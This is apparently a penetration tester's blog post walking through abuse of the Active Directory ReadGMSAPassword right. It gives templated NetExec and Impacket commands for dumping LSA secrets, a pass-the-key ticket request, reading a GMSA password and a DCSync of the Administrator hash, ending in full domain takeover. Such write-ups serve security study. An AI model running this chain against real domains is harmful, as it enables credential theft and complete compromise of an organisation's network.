---
title: "Outbound Control - ReadGMSAPassword (Part 0x1)"
date: 2024-11-10
categories: [First Degree Outbound Controls]
tags: []
---

## Introduction

At a recent egagement, I found a computer configured with the First Degree Outbound Control, `ReadGMSAPassword`. 

## ReadGMSAPassword

Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval. The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

The following image is the BloodHound graph. The important scenario here is that the computer `PC02@AD.LAB` can read the GMSA Password of the Service Account `GMSA-SVC@AD.LAB` and this account as `DCSync` privileges over the `AD.LAB` domain.

![outbound](/assets/blog/outbound/image-1.jpg)

## Dumping LSA

If we gain code execution on this computer, we can use the Kerberos AES Keys or NTLM hash to authenticate as the computer and retrieve the password. In this scenario I assumed that I gained Administrative privileges over the computer. We can use NetExec to dump the SECURITY registry hive and retrieve Kerberos keys.

```Shell
nxc smb {Computer} -u {Administrative Account} -p {Password} --local-auth --lsa
```

![outbound](/assets/blog/outbound/image-2.jpg)

## Pass-the-key Attack

For Opsec concerns, we can ask for a Ticket Grating Ticket using the AES256 key of the computer account to perform a Pass-the-key attack by exporting the `.ccache` file with the `KRB5CCNAME` enviorment variable.

```Shell
getTGT.py -aesKey {AES256 Key} '{Domain Name}/{Computer Name $}@{DC IP Address}'
EXPORT KRB5CCNAME='{CCACHE File}'
```

![outbound](/assets/blog/outbound/image-3.jpg)

Afterwards, we can use NetExec again to retrieve the password using `--gmsa`. LDAPS must be implemented to be able to use this parameter. 

```Shell
nxc ldap {Domain Controller} -k --use-kcache --gmsa
```

![outbound](/assets/blog/outbound/image-4.jpg)

Since the `gmsa-svc$` account has DCSync privileges, we can dump the NTLM hash of the Administrator account.

```Shell
secretsdump.py '{Domain Name}/{User with DCSync Rights}@{DC IP Address}' 
-just-dc-user Administrator -hashes :{LM:NT}
```

![outbound](/assets/blog/outbound/image-5.jpg)

At this point we have complete access to the windows domain.